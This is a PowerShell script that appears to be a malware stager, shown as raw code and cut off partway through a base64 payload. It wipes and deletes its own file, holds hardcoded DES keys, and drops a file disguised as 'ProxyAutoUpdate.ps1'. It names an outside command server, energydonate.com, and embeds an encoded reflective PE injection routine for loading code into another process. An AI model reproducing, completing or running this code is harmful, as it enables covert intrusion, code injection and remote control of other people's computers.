$OwnPath = $MyInvocation.MyCommand.Path;
$OverString = '';
[String]$des_key1 = "Casillas"
[String]$des_iv1 = "Casillas"
[byte[]]$des_key = [Text.Encoding]::ASCII.GetBytes($des_key1)
[byte[]]$des_iv = [Text.Encoding]::ASCII.GetBytes($des_iv1)
$global:VBS_PATH = ""
$global:SCH_PATH = ""
[String]$PS_PATH = "C:\\Users\\Public\\Documents\\ProxyAutoUpdate.ps1";
while ($OverString.Length -le (Get-Item $OwnPath).length)
{
	$OverString = $OverString + -join ((65 .. 90) + (97 .. 122) | Get-Random -Count 100 | % { [char]$_ });
}
$OverString | Out-File -Encoding ascii $OwnPath;
Remove-Item -Path $OwnPath;
$BaseServer = 'http://www.energydonate.com/';
$SecondServer = 'http://www.energydonate.com/';
$BaseUri = '';
$UID = '';
$SystemArchitecture = '';
$psversion = $PSVersionTable.PSVersion.Major;
$global:injectionErrorCode = '';
[System.Management.Automation.PSReference]$refECode = [System.Management.Automation.PSReference]$global:injectionErrorCode;
$global:cmdRes = 0;
$sessionstate = [system.management.automation.runspaces.initialsessionstate]::CreateDefault();
$runspace = [runspacefactory]::CreateRunspace($Host, $sessionstate);
$runspace.Open();
[String]$ps1 = 'W1N0cmluZ10kSW5wdXRTdHJpbmcgPSAnRVhFQ1NUUklORyc7DQpbU3RyaW5nXSRzeklwID0gJ0FERFJTVFJJTkcnOw0KW0ludF0kaWRQcm9jZXNzID0gUE9SVFNUUklORzsNCiRpbmplY3Rpb25FcnJvckNvZGUgPSAnJzsNCiRnbG9iYWw6Y21kUmVzID0gMDsNCmZ1bmN0aW9uIEludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24NCnsNCglbQ21kbGV0QmluZGluZygpXQ0KCVBhcmFtIChbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXVtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldW0J5dGVbXV0kUEVCeXRlcyxbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldW1N0cmluZ1tdXSRDb21wdXRlck5hbWUsW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIpXVtWYWxpZGF0ZVNldCgnV1N0cmluZycsICdTdHJpbmcnLCAnVm9pZCcpXVtTdHJpbmddJEZ1bmNSZXR1cm5UeXBlID0gJ1ZvaWQnLFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV1bU3RyaW5nXSRFeGVBcmdzLFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV1bSW50MzJdJFByb2NJZCxbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSldW1N0cmluZ10kUHJvY05hbWUsW1N3aXRjaF0kRm9yY2VBU0xSLFtTd2l0Y2hdJERvTm90WmVyb01aKQ0KCVNldC1TdHJpY3RNb2RlIC1WZXJzaW9uIDI7DQoJJFJlbW90ZVNjcmlwdEJsb2NrID0gew0KCQlbQ21kbGV0QmluZGluZygpXQ0KCQlQYXJhbSAoDQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCVtCeXRlW11dJFBFQnl0ZXMsDQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCVtTdHJpbmddJEZ1bmNSZXR1cm5UeXBlLA0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQlbSW50MzJdJFByb2NJZCwNCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJW1N0cmluZ10kUHJvY05hbWUsDQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCVtCb29sXSRGb3JjZUFTTFINCgkJKQ0KCQlGdW5jdGlvbiBHZXQtV2luMzJUeXBlcw0KCQl7DQoJCQkkV2luMzJUeXBlcyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdDsNCgkJCSREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbjsNCgkJCSREeW5hbWljQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnRHluYW1pY0Fzc2VtYmx5Jyk7DQoJCQkkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bmFtaWNBc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKTsNCgkJCSRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdEeW5hbWljTW9kdWxlJywgJGZhbHNlKTsNCgkJCSRDb25zdHJ1Y3RvckluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF07DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdNYWNoaW5lVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSk7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnTmF0aXZlJywgW1VJbnQxNl0gMCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJMzg2JywgW1VJbnQxNl0gMHgwMTRjKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0l0YW5pdW0nLCBbVUludDE2XSAweDAyMDApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgneDY0JywgW1VJbnQxNl0gMHg4NjY0KSB8IE91dC1OdWxsOw0KCQkJJE1hY2hpbmVUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTWFjaGluZVR5cGUgLVZhbHVlICRNYWNoaW5lVHlwZTsNCgkJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ01hZ2ljVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSk7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfTlRfT1BUSU9OQUxfSERSMzJfTUFHSUMnLCBbVUludDE2XSAweDEwYikgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9OVF9PUFRJT05BTF9IRFI2NF9NQUdJQycsIFtVSW50MTZdIDB4MjBiKSB8IE91dC1OdWxsOw0KCQkJJE1hZ2ljVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCk7DQoJCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1hZ2ljVHlwZSAtVmFsdWUgJE1hZ2ljVHlwZTsNCgkJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ1N1YlN5c3RlbVR5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9VTktOT1dOJywgW1VJbnQxNl0gMCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fTkFUSVZFJywgW1VJbnQxNl0gMSkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19HVUknLCBbVUludDE2XSAyKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0NVSScsIFtVSW50MTZdIDMpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1BPU0lYX0NVSScsIFtVSW50MTZdIDcpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfQ0VfR1VJJywgW1VJbnQxNl0gOSkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX0FQUExJQ0FUSU9OJywgW1VJbnQxNl0gMTApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9CT09UX1NFUlZJQ0VfRFJJVkVSJywgW1VJbnQxNl0gMTEpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9SVU5USU1FX0RSSVZFUicsIFtVSW50MTZdIDEyKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfUk9NJywgW1VJbnQxNl0gMTMpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1hCT1gnLCBbVUludDE2XSAxNCkgfCBPdXQtTnVsbDsNCgkJCSRTdWJTeXN0ZW1UeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU3ViU3lzdGVtVHlwZSAtVmFsdWUgJFN1YlN5c3RlbVR5cGU7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKTsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMCcsIFtVSW50MTZdIDB4MDAwMSkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMScsIFtVSW50MTZdIDB4MDAwMikgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMicsIFtVSW50MTZdIDB4MDAwNCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMycsIFtVSW50MTZdIDB4MDAwOCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRScsIFtVSW50MTZdIDB4MDA0MCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0ZPUkNFX0lOVEVHUklUWScsIFtVSW50MTZdIDB4MDA4MCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCcsIFtVSW50MTZdIDB4MDEwMCkgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fSVNPTEFUSU9OJywgW1VJbnQxNl0gMHgwMjAwKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19TRUgnLCBbVUludDE2XSAweDA0MDApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX0JJTkQnLCBbVUludDE2XSAweDA4MDApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzQnLCBbVUludDE2XSAweDEwMDApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1dETV9EUklWRVInLCBbVUludDE2XSAweDIwMDApIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1RFUk1JTkFMX1NFUlZFUl9BV0FSRScsIFtVSW50MTZdIDB4ODAwMCkgfCBPdXQtTnVsbDsNCgkJCSREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSAtVmFsdWUgJERsbENoYXJhY3RlcmlzdGljc1R5cGU7DQoJCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9EQVRBX0RJUkVDVE9SWScsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbDsNCgkJCSRJTUFHRV9EQVRBX0RJUkVDVE9SWSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCk7DQoJCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RBVEFfRElSRUNUT1JZIC1WYWx1ZSAkSU1BR0VfREFUQV9ESVJFQ1RPUlk7DQoJCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JzsNCgkJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0ZJTEVfSEVBREVSJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjApOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWNoaW5lJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlNlY3Rpb25zJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUaW1lRGF0ZVN0YW1wJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9TeW1ib2xUYWJsZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZTeW1ib2xzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZPcHRpb25hbEhlYWRlcicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJElNQUdFX0ZJTEVfSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRklMRV9IRUFERVIgLVZhbHVlICRJTUFHRV9GSUxFX0hFQURFUjsNCgkJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JzsNCgkJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX09QVElPTkFMX0hFQURFUjY0JywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjQwKTsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hZ2ljJywgJE1hZ2ljVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMykgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mVW5pbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZFbnRyeVBvaW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyMCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltYWdlQmFzZScsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCgyNCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NlY3Rpb25BbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDM2KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDQpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0OCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg1MCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1dpbjMyVmVyc2lvblZhbHVlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW1hZ2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTYpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFkZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDYwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hlY2tTdW0nLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjQpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTdWJzeXN0ZW0nLCAkU3ViU3lzdGVtVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjgpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbGxDaGFyYWN0ZXJpc3RpY3MnLCAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzApIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja1Jlc2VydmUnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja0NvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg4MCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBSZXNlcnZlJywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcENvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg5NikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwNCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUnZhQW5kU2l6ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTA4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDExMikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjApIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNvdXJjZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjgpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeGNlcHRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTM2KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2VydGlmaWNhdGVUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTQ0KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZVJlbG9jYXRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTUyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVidWcnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2MCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FyY2hpdGVjdHVyZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTY4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnR2xvYmFsUHRyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNzYpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUTFNUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTg0KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZENvbmZpZ1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxOTIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCb3VuZEltcG9ydCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjAwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSUFUJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDgpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWxheUltcG9ydERlc2NyaXB0b3InLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIxNikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NMUlJ1bnRpbWVIZWFkZXInLCAkSU1BR0VfREFUQV9ES